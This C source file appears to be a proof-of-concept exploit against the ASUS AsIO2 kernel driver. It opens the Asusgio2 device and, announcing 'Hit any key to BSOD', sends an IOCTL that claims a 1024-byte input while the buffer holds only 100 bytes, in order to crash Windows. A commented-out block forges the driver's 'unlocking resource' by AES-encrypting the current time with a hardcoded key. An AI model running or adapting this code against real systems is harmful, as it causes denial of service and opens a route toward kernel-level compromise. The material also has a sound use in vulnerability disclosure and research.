NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO;

    hFile = CreateFileW(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
    CloseHandle(hFile);

    return (bytesIO == BufferSize);
}

int main()
{
    //
    // Uncomment to generate unlocking resource.
    //
  /*  
    AES_ctx ctx;
    DWORD a[4] = { 0x16157EAA, 0xA6D2AE28, 0x8815F7AB, 0x3C4FCF09 };
    BYTE Buffer[16];
    AES_init_ctx(&ctx, (uint8_t*)a);
    LARGE_INTEGER fileTime;
    ULONG seconds = 0;
    GetSystemTimePreciseAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);
    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlCopyMemory(Buffer, &seconds, sizeof(DWORD));
    AES_ECB_encrypt(&ctx, (uint8_t*)Buffer);
    supWriteBufferToFile((LPWSTR)L"ASUSCERT.bin", Buffer, sizeof(Buffer));
    return;
    */

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\Asusgio2"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] Asusgio2 device opened\r\n");
    }


    printf_s("[+] Hit any key to BSOD\r\n");
    system("pause");

    UCHAR dBuffer[100];

    NTSTATUS ntStatus = CallDriver(deviceHandle,
        0xA0402450,
        &dBuffer,
        1024,
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }

    CloseHandle(deviceHandle);

    return 0;
}
